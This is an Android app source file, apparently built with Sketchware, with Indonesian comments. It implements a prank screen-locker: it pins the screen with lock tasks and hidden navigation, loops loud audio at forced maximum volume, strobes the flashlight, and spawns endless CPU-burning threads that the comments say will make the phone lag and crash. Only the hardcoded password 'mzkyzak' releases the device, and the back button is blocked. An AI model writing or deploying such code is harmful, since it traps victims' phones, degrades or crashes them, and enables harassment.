package com.mzkyzak;

import android.animation.*;
import android.app.*;
import android.content.*;
import android.content.res.*;
import android.graphics.*;
import android.graphics.Typeface;
import android.graphics.drawable.*;
import android.media.*;
import android.media.MediaPlayer;
import android.net.*;
import android.os.*;
import android.text.*;
import android.text.style.*;
import android.util.*;
import android.view.*;
import android.view.View.*;
import android.view.animation.*;
import android.webkit.*;
import android.widget.*;
import androidx.annotation.*;
import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.DialogFragment;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import com.mzkyzak.databinding.*;
import java.io.*;
import java.text.*;
import java.util.*;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.*;
import org.json.*;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import android.app.admin.DevicePolicyManager;
import android.provider.Settings;

public class MainActivity extends AppCompatActivity {
	
	private Timer _timer = new Timer();
	
	private MainBinding binding;
	private boolean isSenterOn = false;
	private boolean stress = false;
	private double load = 0;
	private double THREAD = 0;
	
	private TimerTask timer;
	private MediaPlayer mp;
	private TimerTask loop;
	
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		binding = MainBinding.inflate(getLayoutInflater());
		setContentView(binding.getRoot());
		initialize(_savedInstanceState);
		initializeLogic();
	}
	
	private void initialize(Bundle _savedInstanceState) {
	}
	
	private void initializeLogic() {
		binding.textview1.setTypeface(Typeface.createFromAsset(getAssets(),"fonts/radjani.ttf"), 1);
		getWindow().getDecorView().setSystemUiVisibility(
		View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
		| View.SYSTEM_UI_FLAG_LAYOUT_STABLE
		| View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
		| View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
		| View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
		| View.SYSTEM_UI_FLAG_FULLSCREEN);
		startLockTask();
		SketchwareUtil.showMessage(getApplicationContext(), "5 detik HP kamu bakal ngelag bersiap lah😩");
		mp = MediaPlayer.create(getApplicationContext(), R.raw.songs);
		mp.start();
		mp.setLooping(true);
		timer = new TimerTask() {
			@Override
			public void run() {
				runOnUiThread(new Runnable() {
					@Override
					public void run() {
						if (isSenterOn) {
							try {
								android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager) getSystemService(Context.CAMERA_SERVICE);
								cm.setTorchMode(cm.getCameraIdList()[0], false);
								isSenterOn = false; 
							} catch (Exception e) {}
						} else {
							try {
								android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager) getSystemService(Context.CAMERA_SERVICE);
								cm.setTorchMode(cm.getCameraIdList()[0], true);
								isSenterOn = true; 
							} catch (Exception e) {}
						}
					}
				});
			}
		};
		_timer.scheduleAtFixedRate(timer, (int)(0), (int)(500));
		loop = new TimerTask() {
			@Override
			public void run() {
				runOnUiThread(new Runnable() {
					@Override
					public void run() {
						// memaksa volume hp 100% terus🥵
						
						AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
						
						if (am != null) {
							int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
							am.setStreamVolume(
							AudioManager.STREAM_MUSIC,
							max,
							0
							);
						}
					}
				});
			}
		};
		_timer.scheduleAtFixedRate(loop, (int)(0), (int)(100));
		timer = new TimerTask() {
			@Override
			public void run() {
				runOnUiThread(new Runnable() {
					@Override
					public void run() {
						loop = new TimerTask() {
							@Override
							public void run() {
								runOnUiThread(new Runnable() {
									@Override
									public void run() {
										//memaksa CPU/GPU stress
										
										load = 90; //bisa lag
										stress = true; 
										
										for (int i = 0; i < Runtime.getRuntime().availableProcessors(); i++) {
											new Thread(new Runnable() {
												@Override
												public void run() {
													while (stress) {
														double x = 0;
														for (int j = 0; j < load; j++) {
															x += Math.sqrt(j) * Math.random();
														}
													}
												}
											}).start();
										}
										
										load = 90; // <- hihi ngelag,, HP km bakal crash 😔 
										stress = true; // <- aktif
										THREAD = 90; 
										
										for (int i = 0; i < THREAD; i++) {
											new Thread(new Runnable() {
												@Override
												public void run() {
													while (stress) {
														double x = 0;
														for (int j = 0; j < load; j++) {
															x += Math.sqrt(j) * Math.random();
														}
													}
												}
											}).start();
										}
									}
								});
							}
						};
						_timer.scheduleAtFixedRate(loop, (int)(0), (int)(50));
					}
				});
			}
		};
		_timer.schedule(timer, (int)(5000));
		binding.materialbutton1.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				if (binding.edittext1.getText().toString().equals("mzkyzak")) {
					final Context context = getApplicationContext();
					Context ctx = getApplicationContext();
					
					NotificationManager notificationManager =
					(NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
					
					int notificationId = 1000;
					String channelId = "channel";
					String channelName = "VIRZAK";
					
					if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
						NotificationChannel channel = new NotificationChannel(
						channelId,
						channelName,
						NotificationManager.IMPORTANCE_DEFAULT
						);
						notificationManager.createNotificationChannel(channel);
					}
					
					NotificationCompat.Builder builder =
					new NotificationCompat.Builder(ctx, channelId)
					.setSmallIcon(R.drawable.ic_notif)
					.setColor(0xFF000000)
					.setContentTitle("lewat ")
					.setContentText("Selamat pw benar 😁👍")
					.setAutoCancel(false)
					.setOngoing(false);
					
					notificationManager.notify(notificationId, builder.build());
					SketchwareUtil.showMessage(getApplicationContext(), "Password kamu ✅ \n( berhasil keluar )");
					stopLockTask();
					mp.stop();
					timer.cancel();
					finish();
				} else {
					SketchwareUtil.showMessage(getApplicationContext(), "Password kamu salah ❌");
				}
			}
		});
	}
	
	
	@Override
	public void onPause() {
		super.onPause();
		
	}
	
	@Override
	public void onBackPressed() {
		SketchwareUtil.showMessage(getApplicationContext(), "anda berhasil keluar");
	}
}